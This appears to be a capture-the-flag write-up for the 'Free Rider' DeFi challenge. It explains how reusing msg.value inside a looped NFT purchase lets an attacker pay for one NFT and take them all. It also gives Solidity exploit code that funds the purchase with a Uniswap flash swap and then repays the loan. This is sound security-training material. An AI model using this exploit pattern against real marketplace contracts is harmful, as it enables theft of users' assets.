# Free Rider

1. To solve this challenge, we have to first find a way to somehow get the NFTs without paying the actual price, and if required, how to flash loan some ETH.

2. We can look into `buyMany` function in `FreeRiderNFTMarketplace.sol`, which call `_buyOne` for the numbers of `tokenIds` array. Inside `_buyOne` it will used `msg.value` and compare it with `priceToPay`, but since we call it in single transaction, every `tokenIds` iteration will have same `msg.value`, which mean we only have to pay for 1 NFTs and we can get the rest for free.

3. But still, we need 15 ETH from somewhere. This one is not mentioned and obvious, but we can flash swap to the created `UniswapPair` contract. With the ETH we got from flash swap, we call `buyMany` and return the borrowed eth to `UniswapPair` .The full code available at `FreeRiderAttack.sol`. Then send all the NFTs to `FreeRiderBuyer` contract.

```solidity
    function flashSwap(uint wethAmount) external {
        // Need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(WETH, wethAmount);

        // amount0Out is WETH, amount1Out is DVT
        pair.swap(wethAmount, 0, address(this), data);

        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), owner, i);
        }
    }

    // This function is called by the DVT/WETH pair contract
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");

        (address tokenBorrow, uint wethAmount) = abi.decode(
            data,
            (address, uint)
        );

        // Your custom code would go here. For example, code to arbitrage.
        require(tokenBorrow == WETH, "token borrow != WETH");

        // do malicious thing here
        // first withdraw ETH
        IWETH(WETH).withdraw(wethAmount);

        // then buy NFTs
        marketplace.buyMany{value: 15 ether}(arrayId);
        // then deposit WETH

        // about 0.3% fee, +1 to round up
        uint fee = (wethAmount * 3) / 997 + 1;
        amountToRepay = wethAmount + fee;

        IWETH(WETH).deposit{value: amountToRepay}();

        // // Transfer flash swap fee from caller
        // weth.transferFrom(caller, address(this), fee);

        // Repay
        weth.transfer(address(pair), amountToRepay);
    }
```
